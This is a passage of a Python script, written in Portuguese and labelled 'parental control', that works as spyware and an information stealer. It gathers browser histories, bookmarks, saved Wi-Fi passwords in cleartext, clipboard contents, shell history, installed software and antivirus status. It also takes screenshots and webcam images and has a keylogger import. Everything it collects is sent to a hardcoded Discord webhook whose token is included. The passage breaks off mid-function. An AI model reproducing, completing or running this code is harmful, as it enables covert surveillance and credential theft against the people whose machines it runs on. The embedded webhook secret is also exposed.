#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CONTROLE PARENTAL AVANCADO - 35+ FUNCIONALIDADES
Discord organizado com embeds bonitos
"""

import subprocess,sys,os,time,json,platform,shutil,sqlite3,socket,uuid,re,base64,struct,glob
from datetime import datetime,timedelta
from pathlib import Path
from urllib.request import Request,urlopen
from collections import defaultdict

print("\n" + "="*60)
print("  INSTALANDO DEPENDENCIAS...")
print("="*60 + "\n")

DEPS = [
    "psutil",
    "pillow", 
    "opencv-python",
    "sounddevice",
    "scipy",
    "numpy",
    "pyperclip",
    "mss",
    "pynput"
]

for p in DEPS:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", p],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("    [OK] " + p)
    except:
        print("    [--] " + p + " (opcional)")

print("\n[+] Dependencias verificadas!\n")

# ==================== IMPORTS ====================
import psutil

try:
    from PIL import ImageGrab, Image
    import mss
    import mss.tools
    TEM_SCREENSHOT = True
except:
    TEM_SCREENSHOT = False

try:
    import cv2
    TEM_CAMERA = True
except:
    TEM_CAMERA = False

try:
    import sounddevice as sd
    import scipy.io.wavfile as wavfile
    import numpy as np
    TEM_AUDIO = True
except:
    TEM_AUDIO = False

try:
    import pyperclip
    TEM_CLIPBOARD = True
except:
    TEM_CLIPBOARD = False

try:
    from pynput import keyboard as kb
    TEM_KEYLOGGER = True
except:
    TEM_KEYLOGGER = False

# ==================== CONFIG ====================
WEBHOOK = "https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"

SISTEMA = platform.system()
HOME = str(Path.home())
PASTA = os.path.join(HOME, "ParentalControl")
INTERVALO = 30  # minutos

# Criar pastas
for p in ["relatorios", "capturas", "audio", "videos", "logs"]:
    os.makedirs(os.path.join(PASTA, p), exist_ok=True)

# Keylogger buffer
TECLAS_LOG = []

# ==================== FUNCOES AUXILIARES ====================
def ts():
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

def hora():
    return datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def tamanho_arquivo(bytes):
    for unit in ["B", "KB", "MB", "GB"]:
        if bytes < 1024:
            return str(round(bytes, 1)) + " " + unit
        bytes /= 1024
    return str(round(bytes, 1)) + " TB"

# ==================== DISCORD FORMATADO ====================
def discord_embed(titulo, descricao, cor=3447003, campos=None):
    """Envia embed formatado para Discord."""
    try:
        embed = {
            "title": titulo,
            "description": descricao[:4000] if descricao else "",
            "color": cor,
            "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.000Z"),
            "footer": {"text": "Controle Parental | " + SISTEMA + " | " + hora()}
        }
        
        if campos:
            embed["fields"] = []
            for nome, valor, inline in campos[:25]:
                embed["fields"].append({
                    "name": str(nome)[:256],
                    "value": str(valor)[:1024] if valor else "N/A",
                    "inline": inline
                })
        
        dados = json.dumps({"embeds": [embed]}).encode("utf-8")
        req = Request(WEBHOOK, data=dados)
        req.add_header("Content-Type", "application/json")
        req.add_header("User-Agent", "Mozilla/5.0")
        urlopen(req, timeout=30)
        print("[+] Discord: " + titulo)
        return True
    except Exception as e:
        print("[-] Discord erro: " + str(e))
        return False

def discord_arquivo(caminho, titulo="", descricao=""):
    """Envia arquivo com embed."""
    try:
        if not os.path.exists(caminho):
            print("[-] Arquivo nao existe: " + caminho)
            return False
        
        with open(caminho, "rb") as f:
            dados = f.read()
        
        nome = os.path.basename(caminho)
        tamanho = tamanho_arquivo(len(dados))
        
        b = "----WebKitFormBoundary" + str(int(time.time() * 1000))
        
        # Payload JSON para embed
        payload = {
            "embeds": [{
                "title": titulo if titulo else nome,
                "description": descricao if descricao else "Arquivo: " + nome + " (" + tamanho + ")",
                "color": 15105570,
                "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.000Z")
            }]
        }
        
        body = b""
        body += ("--" + b + "\r\n").encode()
        body += b'Content-Disposition: form-data; name="payload_json"\r\n'
        body += b"Content-Type: application/json\r\n\r\n"
        body += json.dumps(payload).encode() + b"\r\n"
        
        body += ("--" + b + "\r\n").encode()
        body += ('Content-Disposition: form-data; name="file"; filename="' + nome + '"\r\n').encode()
        body += b"Content-Type: application/octet-stream\r\n\r\n"
        body += dados + b"\r\n"
        body += ("--" + b + "--\r\n").encode()
        
        req = Request(WEBHOOK, data=body)
        req.add_header("Content-Type", "multipart/form-data; boundary=" + b)
        req.add_header("User-Agent", "Mozilla/5.0")
        urlopen(req, timeout=120)
        print("[+] Arquivo: " + nome)
        return True
    except Exception as e:
        print("[-] Erro arquivo: " + str(e))
        return False

def discord_separador(texto):
    """Envia separador visual."""
    msg = "```\n" + "="*45 + "\n"
    msg += "  " + texto.upper() + "\n"
    msg += "="*45 + "\n```"
    
    try:
        dados = json.dumps({"content": msg}).encode()
        req = Request(WEBHOOK, data=dados)
        req.add_header("Content-Type", "application/json")
        urlopen(req, timeout=10)
        return True
    except:
        return False

# ==================== FUNCIONALIDADES ====================

# [1] LOCALIZACAO IP
def get_localizacao():
    try:
        req = Request("http://ip-api.com/json/?fields=66846719")
        req.add_header("User-Agent", "Mozilla/5.0")
        r = urlopen(req, timeout=10)
        d = json.loads(r.read().decode())
        return {
            "ip": d.get("query", "?"),
            "cidade": d.get("city", "?"),
            "regiao": d.get("regionName", "?"),
            "pais": d.get("country", "?"),
            "codigo_pais": d.get("countryCode", "?"),
            "isp": d.get("isp", "?"),
            "org": d.get("org", "?"),
            "as": d.get("as", "?"),
            "lat": str(d.get("lat", "?")),
            "lon": str(d.get("lon", "?")),
            "timezone": d.get("timezone", "?"),
            "zip": d.get("zip", "?")
        }
    except:
        return {}

# [2] SISTEMA DETALHADO
def get_sistema():
    try:
        mem = psutil.virtual_memory()
        swap = psutil.swap_memory()
        
        if SISTEMA == "Windows":
            disco = psutil.disk_usage("C:\\")
        else:
            disco = psutil.disk_usage("/")
        
        bat = psutil.sensors_battery()
        boot = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot
        
        # CPU info
        cpu_freq = psutil.cpu_freq()
        
        return {
            "so": SISTEMA + " " + platform.release(),
            "versao_so": platform.version(),
            "arquitetura": platform.machine(),
            "hostname": platform.node(),
            "usuario": os.environ.get("USER", os.environ.get("USERNAME", "?")),
            "processador": platform.processor()[:50] if platform.processor() else "?",
            "nucleos_fisicos": str(psutil.cpu_count(logical=False)),
            "nucleos_logicos": str(psutil.cpu_count(logical=True)),
            "cpu_freq_atual": str(round(cpu_freq.current, 0)) + " MHz" if cpu_freq else "?",
            "cpu_freq_max": str(round(cpu_freq.max, 0)) + " MHz" if cpu_freq else "?",
            "cpu_uso": str(psutil.cpu_percent(interval=1)) + "%",
            "ram_total": tamanho_arquivo(mem.total),
            "ram_usada": tamanho_arquivo(mem.used),
            "ram_livre": tamanho_arquivo(mem.available),
            "ram_percent": str(mem.percent) + "%",
            "swap_total": tamanho_arquivo(swap.total),
            "swap_usado": tamanho_arquivo(swap.used),
            "swap_percent": str(swap.percent) + "%",
            "disco_total": tamanho_arquivo(disco.total),
            "disco_usado": tamanho_arquivo(disco.used),
            "disco_livre": tamanho_arquivo(disco.free),
            "disco_percent": str(disco.percent) + "%",
            "bateria": str(bat.percent) + "%" if bat else "Sem bateria",
            "a_carregar": "Sim" if bat and bat.power_plugged else "Nao" if bat else "N/A",
            "tempo_bateria": str(timedelta(seconds=bat.secsleft)) if bat and bat.secsleft > 0 else "?",
            "boot_time": boot.strftime("%d/%m/%Y %H:%M:%S"),
            "uptime": str(uptime).split(".")[0]
        }
    except Exception as e:
        return {"erro": str(e)}

# [3] PROCESSOS DETALHADOS
def get_processos():
    lista = []
    try:
        for p in psutil.process_iter(["pid", "name", "memory_percent", "cpu_percent", "username", "status", "create_time"]):
            try:
                info = p.info
                mem = info.get("memory_percent", 0) or 0
                if mem > 0.1:
                    create = datetime.fromtimestamp(info["create_time"]).strftime("%H:%M:%S") if info.get("create_time") else "?"
                    lista.append({
                        "nome": info["name"][:25],
                        "pid": info["pid"],
                        "ram": round(mem, 1),
                        "cpu": round(info.get("cpu_percent", 0) or 0, 1),
                        "user": str(info.get("username", "?"))[:15],
                        "status": info.get("status", "?"),
                        "inicio": create
                    })
            except:
                pass
        lista.sort(key=lambda x: x["ram"], reverse=True)
    except:
        pass
    return lista[:60]

# [4] HISTORICO CHROME
def get_chrome_history():
    historico = []
    try:
        if SISTEMA == "Windows":
            paths = [
                os.path.join(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History"),
                os.path.join(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Profile 1", "History")
            ]
        else:
            paths = [
                os.path.join(HOME, ".config", "google-chrome", "Default", "History"),
                os.path.join(HOME, ".config", "chromium", "Default", "History")
            ]
        
        for path in paths:
            if os.path.exists(path):
                temp = os.path.join(PASTA, "chrome_h_" + str(int(time.time())) + ".db")
                shutil.copy2(path, temp)
                conn = sqlite3.connect(temp)
                cur = conn.cursor()
                cur.execute("""
                    SELECT url, title, visit_count, 
                    datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime')
                    FROM urls ORDER BY last_visit_time DESC LIMIT 150
                """)
                for url, titulo, visitas, data in cur.fetchall():
                    historico.append({
                        "titulo": (titulo or "Sem titulo")[:50],
                        "url": url[:100],
                        "visitas": visitas,
                        "data": str(data)
                    })
                conn.close()
                os.remove(temp)
                break
    except:
        pass
    return historico

# [5] HISTORICO FIREFOX
def get_firefox_history():
    historico = []
    try:
        if SISTEMA == "Windows":
            base = os.path.join(HOME, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
        else:
            base = os.path.join(HOME, ".mozilla", "firefox")
        
        if os.path.exists(base):
            for pasta in os.listdir(base):
                places = os.path.join(base, pasta, "places.sqlite")
                if os.path.exists(places):
                    temp = os.path.join(PASTA, "firefox_h_" + str(int(time.time())) + ".db")
                    shutil.copy2(places, temp)
                    conn = sqlite3.connect(temp)
                    cur = conn.cursor()
                    cur.execute("""
                        SELECT url, title, visit_count,
                        datetime(last_visit_date/1000000,'unixepoch','localtime')
                        FROM moz_places WHERE last_visit_date IS NOT NULL
                        ORDER BY last_visit_date DESC LIMIT 150
                    """)
                    for url, titulo, visitas, data in cur.fetchall():
                        historico.append({
                            "titulo": (titulo or "Sem titulo")[:50],
                            "url": url[:100],
                            "visitas": visitas,
                            "data": str(data)
                        })
                    conn.close()
                    os.remove(temp)
                    break
    except:
        pass
    return historico

# [6] HISTORICO EDGE
def get_edge_history():
    historico = []
    try:
        if SISTEMA == "Windows":
            path = os.path.join(HOME, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "History")
            if os.path.exists(path):
                temp = os.path.join(PASTA, "edge_h_" + str(int(time.time())) + ".db")
                shutil.copy2(path, temp)
                conn = sqlite3.connect(temp)
                cur = conn.cursor()
                cur.execute("""
                    SELECT url, title, visit_count,
                    datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime')
                    FROM urls ORDER BY last_visit_time DESC LIMIT 150
                """)
                for url, titulo, visitas, data in cur.fetchall():
                    historico.append({
                        "titulo": (titulo or "Sem titulo")[:50],
                        "url": url[:100],
                        "visitas": visitas,
                        "data": str(data)
                    })
                conn.close()
                os.remove(temp)
    except:
        pass
    return historico

# [7] FAVORITOS CHROME
def get_chrome_bookmarks():
    favoritos = []
    try:
        if SISTEMA == "Windows":
            path = os.path.join(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Bookmarks")
        else:
            path = os.path.join(HOME, ".config", "google-chrome", "Default", "Bookmarks")
        
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            
            def extract(node):
                if "children" in node:
                    for child in node["children"]:
                        extract(child)
                elif node.get("type") == "url":
                    favoritos.append({
                        "nome": node.get("name", "?")[:40],
                        "url": node.get("url", "?")[:80]
                    })
            
            for root in data.get("roots", {}).values():
                if isinstance(root, dict):
                    extract(root)
    except:
        pass
    return favoritos[:100]

# [8] EXTENSOES CHROME
def get_chrome_extensions():
    extensoes = []
    try:
        if SISTEMA == "Windows":
            path = os.path.join(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Extensions")
        else:
            path = os.path.join(HOME, ".config", "google-chrome", "Default", "Extensions")
        
        if os.path.exists(path):
            for ext_id in os.listdir(path):
                ext_path = os.path.join(path, ext_id)
                if os.path.isdir(ext_path):
                    for version in os.listdir(ext_path):
                        manifest = os.path.join(ext_path, version, "manifest.json")
                        if os.path.exists(manifest):
                            try:
                                with open(manifest, "r", encoding="utf-8") as f:
                                    data = json.load(f)
                                extensoes.append({
                                    "nome": data.get("name", ext_id)[:40],
                                    "versao": data.get("version", "?"),
                                    "descricao": data.get("description", "?")[:50]
                                })
                            except:
                                pass
                            break
    except:
        pass
    return extensoes[:50]

# [9] REDES WIFI
def get_wifi_networks():
    redes = []
    try:
        if SISTEMA == "Windows":
            output = subprocess.run(["netsh", "wlan", "show", "profiles"], 
                capture_output=True, text=True, timeout=15, encoding="utf-8", errors="ignore")
            for linha in output.stdout.split("\n"):
                if "Perfil de Todos" in linha or "All User Profile" in linha:
                    partes = linha.split(":")
                    if len(partes) > 1:
                        rede = partes[1].strip()
                        if rede:
                            redes.append(rede)
        else:
            output = subprocess.run(["nmcli", "-t", "-f", "NAME,TYPE", "connection", "show"],
                capture_output=True, text=True, timeout=15)
            for linha in output.stdout.split("\n"):
                if "wireless" in linha.lower() or "wifi" in linha.lower():
                    nome = linha.split(":")[0]
                    if nome:
                        redes.append(nome)
    except:
        pass
    return redes

# [10] SENHAS WIFI (Windows)
def get_wifi_passwords():
    senhas = []
    try:
        if SISTEMA == "Windows":
            output = subprocess.run(["netsh", "wlan", "show", "profiles"],
                capture_output=True, text=True, timeout=15, encoding="utf-8", errors="ignore")
            
            perfis = []
            for linha in output.stdout.split("\n"):
                if "Perfil de Todos" in linha or "All User Profile" in linha:
                    partes = linha.split(":")
                    if len(partes) > 1:
                        perfis.append(partes[1].strip())
            
            for perfil in perfis[:30]:
                try:
                    result = subprocess.run(
                        ["netsh", "wlan", "show", "profile", perfil, "key=clear"],
                        capture_output=True, text=True, timeout=10, encoding="utf-8", errors="ignore"
                    )
                    senha = "?"
                    for linha in result.stdout.split("\n"):
                        if "Conte" in linha and "da Chave" in linha or "Key Content" in linha:
                            partes = linha.split(":")
                            if len(partes) > 1:
                                senha = partes[1].strip()
                    senhas.append({"rede": perfil, "senha": senha})
                except:
                    pass
    except:
        pass
    return senhas

# [11] INFO REDE
def get_network_info():
    info = {}
    try:
        info["hostname"] = socket.gethostname()
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info["ip_local"] = s.getsockname()[0]
            s.close()
        except:
            info["ip_local"] = "?"
        
        info["mac"] = ":".join(re.findall("..", "%012x" % uuid.getnode()))
        
        # Interfaces
        interfaces = psutil.net_if_addrs()
        for nome, addrs in list(interfaces.items())[:5]:
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    info["if_" + nome[:10]] = addr.address
        
        # Estatisticas
        net_io = psutil.net_io_counters()
        info["bytes_enviados"] = tamanho_arquivo(net_io.bytes_sent)
        info["bytes_recebidos"] = tamanho_arquivo(net_io.bytes_recv)
        info["pacotes_enviados"] = str(net_io.packets_sent)
        info["pacotes_recebidos"] = str(net_io.packets_recv)
        
        # Conexoes ativas
        conns = psutil.net_connections()
        info["conexoes_total"] = len(conns)
        info["conexoes_established"] = len([c for c in conns if c.status == "ESTABLISHED"])
        info["conexoes_listen"] = len([c for c in conns if c.status == "LISTEN"])
    except:
        pass
    return info

# [12] PORTAS ABERTAS
def get_open_ports():
    portas = []
    try:
        conns = psutil.net_connections()
        seen = set()
        for conn in conns:
            if conn.status == "LISTEN" and conn.laddr:
                port = conn.laddr.port
                if port not in seen:
                    seen.add(port)
                    try:
                        proc = psutil.Process(conn.pid)
                        nome = proc.name()
                    except:
                        nome = "?"
                    portas.append({
                        "porta": port,
                        "processo": nome[:20],
                        "pid": conn.pid
                    })
        portas.sort(key=lambda x: x["porta"])
    except:
        pass
    return portas[:30]

# [13] CLIPBOARD
def get_clipboard():
    if not TEM_CLIPBOARD:
        return ""
    try:
        return pyperclip.paste()[:2000]
    except:
        return ""

# [14] APPS INSTALADAS
def get_installed_apps():
    apps = []
    
    if SISTEMA == "Windows":
        try:
            import winreg
            paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
            ]
            
            for hkey, caminho in paths:
                try:
                    chave = winreg.OpenKey(hkey, caminho)
                    for i in range(winreg.QueryInfoKey(chave)[0]):
                        try:
                            sub_nome = winreg.EnumKey(chave, i)
                            sub_chave = winreg.OpenKey(chave, sub_nome)
                            try:
                                nome = winreg.QueryValueEx(sub_chave, "DisplayName")[0]
                                try:
                                    versao = winreg.QueryValueEx(sub_chave, "DisplayVersion")[0]
                                except:
                                    versao = "?"
                                if nome and nome not in [a["nome"] for a in apps]:
                                    apps.append({"nome": nome[:40], "versao": str(versao)[:15]})
                            except:
                                pass
                            winreg.CloseKey(sub_chave)
                        except:
                            continue
                    winreg.CloseKey(chave)
                except:
                    continue
        except:
            pass
    else:
        try:
            output = subprocess.run(["dpkg", "--list"], capture_output=True, text=True, timeout=30)
            for linha in output.stdout.split("\n")[5:150]:
                partes = linha.split()
                if len(partes) > 2:
                    apps.append({"nome": partes[1][:40], "versao": partes[2][:15]})
        except:
            pass
    
    apps.sort(key=lambda x: x["nome"].lower())
    return apps[:200]

# [15] PROGRAMAS STARTUP
def get_startup_programs():
    programas = []
    
    if SISTEMA == "Windows":
        try:
            import winreg
            paths = [
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce")
            ]
            
            for hkey, caminho in paths:
                try:
                    chave = winreg.OpenKey(hkey, caminho)
                    i = 0
                    while True:
                        try:
                            nome, valor, _ = winreg.EnumValue(chave, i)
                            programas.append({
                                "nome": nome[:30],
                                "caminho": str(valor)[:60]
                            })
                            i += 1
                        except:
                            break
                    winreg.CloseKey(chave)
                except:
                    continue
        except:
            pass
        
        # Startup folder
        startup_folder = os.path.join(HOME, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if os.path.exists(startup_folder):
            for f in os.listdir(startup_folder):
                programas.append({"nome": f[:30], "caminho": "Startup Folder"})
    else:
        autostart = os.path.join(HOME, ".config", "autostart")
        if os.path.exists(autostart):
            for f in os.listdir(autostart):
                programas.append({"nome": f[:30], "caminho": autostart})
    
    return programas

# [16] DOWNLOADS RECENTES
def get_recent_downloads():
    downloads = []
    try:
        pasta = os.path.join(HOME, "Downloads")
        if os.path.exists(pasta):
            ficheiros = []
            for f in os.listdir(pasta)[:100]:
                caminho = os.path.join(pasta, f)
                if os.path.isfile(caminho):
                    stat = os.stat(caminho)
                    ficheiros.append({
                        "nome": f[:45],
                        "tamanho": tamanho_arquivo(stat.st_size),
                        "modificado": datetime.fromtimestamp(stat.st_mtime).strftime("%d/%m/%Y %H:%M")
                    })
            ficheiros.sort(key=lambda x: x["modificado"], reverse=True)
            downloads = ficheiros[:50]
    except:
        pass
    return downloads

# [17] DOCUMENTOS RECENTES
def get_recent_documents():
    docs = []
    try:
        pastas = [
            os.path.join(HOME, "Documents"),
            os.path.join(HOME, "Documentos"),
            os.path.join(HOME, "Desktop"),
            os.path.join(HOME, "Ambiente de Trabalho")
        ]
        
        for pasta in pastas:
            if os.path.exists(pasta):
                for f in os.listdir(pasta)[:50]:
                    caminho = os.path.join(pasta, f)
                    if os.path.isfile(caminho):
                        stat = os.stat(caminho)
                        docs.append({
                            "nome": f[:40],
                            "pasta": os.path.basename(pasta),
                            "tamanho": tamanho_arquivo(stat.st_size),
                            "modificado": datetime.fromtimestamp(stat.st_mtime).strftime("%d/%m/%Y %H:%M")
                        })
        
        docs.sort(key=lambda x: x["modificado"], reverse=True)
    except:
        pass
    return docs[:40]

# [18] DISPOSITIVOS USB
def get_usb_devices():
    dispositivos = []
    try:
        if SISTEMA == "Windows":
            output = subprocess.run(
                ["wmic", "path", "Win32_PnPEntity", "where", "PNPClass='USB'", "get", "Name,Status"],
                capture_output=True, text=True, timeout=15, encoding="utf-8", errors="ignore"
            )
            for linha in output.stdout.split("\n")[1:]:
                linha = linha.strip()
                if linha and "Name" not in linha:
                    dispositivos.append(linha[:60])
        else:
            output = subprocess.run(["lsusb"], capture_output=True, text=True, timeout=10)
            for linha in output.stdout.split("\n"):
                if linha.strip():
                    dispositivos.append(linha.strip()[:60])
    except:
        pass
    return dispositivos[:20]

# [19] DRIVES E PARTICOES
def get_disk_partitions():
    particoes = []
    try:
        for p in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(p.mountpoint)
                particoes.append({
                    "drive": p.device[:10],
                    "mount": p.mountpoint[:20],
                    "tipo": p.fstype,
                    "total": tamanho_arquivo(usage.total),
                    "usado": tamanho_arquivo(usage.used),
                    "livre": tamanho_arquivo(usage.free),
                    "percent": str(usage.percent) + "%"
                })
            except:
                particoes.append({
                    "drive": p.device[:10],
                    "mount": p.mountpoint[:20],
                    "tipo": p.fstype,
                    "total": "?",
                    "usado": "?",
                    "livre": "?",
                    "percent": "?"
                })
    except:
        pass
    return particoes

# [20] USUARIOS LOGADOS
def get_logged_users():
    usuarios = []
    try:
        for u in psutil.users():
            usuarios.append({
                "nome": u.name,
                "terminal": u.terminal or "console",
                "host": u.host or "local",
                "inicio": datetime.fromtimestamp(u.started).strftime("%d/%m/%Y %H:%M")
            })
    except:
        pass
    return usuarios

# [21] TAREFAS AGENDADAS (Windows)
def get_scheduled_tasks():
    tarefas = []
    try:
        if SISTEMA == "Windows":
            output = subprocess.run(
                ["schtasks", "/query", "/fo", "CSV", "/nh"],
                capture_output=True, text=True, timeout=30, encoding="utf-8", errors="ignore"
            )
            for linha in output.stdout.split("\n")[:50]:
                partes = linha.split('","')
                if len(partes) >= 2:
                    nome = partes[0].replace('"', "")
                    if nome and not nome.startswith("\\Microsoft"):
                        tarefas.append(nome[:50])
    except:
        pass
    return tarefas[:30]

# [22] IMPRESSORAS
def get_printers():
    impressoras = []
    try:
        if SISTEMA == "Windows":
            output = subprocess.run(
                ["wmic", "printer", "get", "Name,PortName,Default"],
                capture_output=True, text=True, timeout=15, encoding="utf-8", errors="ignore"
            )
            for linha in output.stdout.split("\n")[1:]:
                linha = linha.strip()
                if linha:
                    impressoras.append(linha[:50])
        else:
            output = subprocess.run(["lpstat", "-p"], capture_output=True, text=True, timeout=10)
            for linha in output.stdout.split("\n"):
                if linha.strip():
                    impressoras.append(linha.strip()[:50])
    except:
        pass
    return impressoras[:10]

# [23] DISPOSITIVOS BLUETOOTH
def get_bluetooth_devices():
    dispositivos = []
    try:
        if SISTEMA == "Windows":
            output = subprocess.run(
                ["wmic", "path", "Win32_PnPEntity", "where", "PNPClass='Bluetooth'", "get", "Name"],
                capture_output=True, text=True, timeout=15, encoding="utf-8", errors="ignore"
            )
            for linha in output.stdout.split("\n")[1:]:
                linha = linha.strip()
                if linha:
                    dispositivos.append(linha[:40])
    except:
        pass
    return dispositivos[:15]

# [24] FICHEIROS RECENTES (Windows)
def get_recent_files():
    ficheiros = []
    try:
        if SISTEMA == "Windows":
            recent = os.path.join(HOME, "AppData", "Roaming", "Microsoft", "Windows", "Recent")
            if os.path.exists(recent):
                for f in os.listdir(recent)[:50]:
                    if f.endswith(".lnk"):
                        nome = f[:-4]
                        caminho = os.path.join(recent, f)
                        mtime = datetime.fromtimestamp(os.path.getmtime(caminho))
                        ficheiros.append({
                            "nome": nome[:40],
                            "acedido": mtime.strftime("%d/%m/%Y %H:%M")
                        })
                ficheiros.sort(key=lambda x: x["acedido"], reverse=True)
    except:
        pass
    return ficheiros[:40]

# [25] ANTIVIRUS (Windows)
def get_antivirus():
    antivirus = []
    try:
        if SISTEMA == "Windows":
            output = subprocess.run(
                ["wmic", "/namespace:\\\\root\\SecurityCenter2", "path", "AntiVirusProduct", "get", "displayName"],
                capture_output=True, text=True, timeout=15, encoding="utf-8", errors="ignore"
            )
            for linha in output.stdout.split("\n")[1:]:
                linha = linha.strip()
                if linha:
                    antivirus.append(linha)
    except:
        pass
    return antivirus

# [26] FIREWALL STATUS
def get_firewall_status():
    status = {}
    try:
        if SISTEMA == "Windows":
            output = subprocess.run(
                ["netsh", "advfirewall", "show", "allprofiles", "state"],
                capture_output=True, text=True, timeout=10, encoding="utf-8", errors="ignore"
            )
            status["info"] = output.stdout[:500]
    except:
        pass
    return status

# [27] VARIAVEIS DE AMBIENTE
def get_environment_vars():
    vars = {}
    try:
        important = ["PATH", "USERNAME", "USERPROFILE", "COMPUTERNAME", "OS", 
                     "PROCESSOR_ARCHITECTURE", "TEMP", "APPDATA", "PROGRAMFILES"]
        for key in important:
            val = os.environ.get(key, "")
            if val:
                vars[key] = val[:100]
    except:
        pass
    return vars

# [28] INFO MONITORES
def get_monitors():
    monitores = []
    try:
        if SISTEMA == "Windows" and TEM_SCREENSHOT:
            with mss.mss() as sct:
                for i, m in enumerate(sct.monitors[1:], 1):
                    monitores.append({
                        "monitor": i,
                        "largura": m["width"],
                        "altura": m["height"],
                        "posicao": str(m["left"]) + "x" + str(m["top"])
                    })
    except:
        pass
    return monitores

# [29] SERVICOS EM EXECUCAO
def get_running_services():
    servicos = []
    try:
        if SISTEMA == "Windows":
            output = subprocess.run(
                ["sc", "query", "state=", "running"],
                capture_output=True, text=True, timeout=30, encoding="utf-8", errors="ignore"
            )
            current = {}
            for linha in output.stdout.split("\n"):
                if "SERVICE_NAME:" in linha:
                    if current:
                        servicos.append(current)
                    current = {"nome": linha.split(":")[1].strip()[:30]}
                elif "DISPLAY_NAME:" in linha:
                    current["descricao"] = linha.split(":")[1].strip()[:40]
            if current:
                servicos.append(current)
    except:
        pass
    return servicos[:50]

# [30] HISTORICO COMANDOS
def get_command_history():
    historico = []
    try:
        if SISTEMA != "Windows":
            # Bash history
            bash_hist = os.path.join(HOME, ".bash_history")
            if os.path.exists(bash_hist):
                with open(bash_hist, "r", errors="ignore") as f:
                    linhas = f.readlines()[-100:]
                    historico = [l.strip()[:60] for l in linhas if l.strip()]
    except:
        pass
    return historico

# [31] COOKIES COUNT
def get_cookies_count():
    cookies = {}
    try:
        if SISTEMA == "Windows":
            chrome_cookies = os.path.join(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
            if os.path.exists(chrome_cookies):
                cookies["chrome"] = "Presente"
            
            edge_cookies = os.path.join(HOME, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Cookies")
            if os.path.exists(edge_cookies):
                cookies["edge"] = "Presente"
    except:
        pass
    return cookies

# ==================== CAPTURAS ====================

# [32] SCREENSHOT - MULTIPLOS METODOS
def capturar_screenshot():
    if not TEM_SCREENSHOT:
        print("[-] Screenshot: dependencias nao instaladas")
        return None
    
    arquivo = os.path.join(PASTA, "capturas", "screenshot_" + ts() + ".png")
    
    # Metodo 1: MSS (mais rapido)
    try:
        with mss.mss() as sct:
            sct.shot(output=arquivo)
        if os.path.exists(arquivo) and os.path.getsize(arquivo) > 1000:
            print("[+] Screenshot OK (mss)")
            return arquivo
    except Exception as e:
        print("[-] MSS falhou: " + str(e))
    
    # Metodo 2: PIL ImageGrab
    try:
        img = ImageGrab.grab()
        img.save(arquivo)
        if os.path.exists(arquivo) and os.path.getsize(arquivo) > 1000:
            print("[+] Screenshot OK (PIL)")
            return arquivo
    except Exception as e:
        print("[-] PIL falhou: " + str(e))
    
    # Metodo 3: Linux fallback
    if SISTEMA != "Windows":
        try:
            os.system("scrot " + arquivo + " 2>/dev/null || gnome-screenshot -f " + arquivo + " 2>/dev/null")
            if os.path.exists(arquivo) and os.path.getsize(arquivo) > 1000:
                print("[+] Screenshot OK (scrot)")
                return arquivo
        except:
            pass
    
    print("[-] Screenshot: todos metodos falharam")
    return None

# [33] CAMERA - MULTIPLOS METODOS
def capturar_camera():
    if not TEM_CAMERA:
        print("[-] Camera: OpenCV nao instalado")
        return None
    
    arquivo = os.path.join(PASTA, "capturas", "camera_" + ts() + ".jpg")
    
    print("[*] A aceder camera...")
    
    # Tentar diferentes backends e indices
    backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY] if SISTEMA == "Windows" else [cv2.CAP_V4L2, cv2.CAP_ANY]
    
    cap = None
    for backend in backends:
        for i in range(3):
            try:
                cap = cv2.VideoCapture(i, backend)
                if cap.isOpened():
                    print("[+] Camera encontrada: index=" + str(i))
                    break
                cap.release()
                cap = None
            except:
                pass
        if cap and cap.isOpened():
            break
    
    if not cap or not cap.isOpened():
        print("[-] Nenhuma camera encontrada")
        return None
    
    try:
        # Configurar resolucao
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        
        # Esperar camera estabilizar
        time.sleep(2)
        
        # Capturar varios frames
        frame = None
        for _ in range(15):
            ret, frame = cap.read()
        
        cap.release()
        
        if ret and frame is not None:
            # Adicionar timestamp na imagem
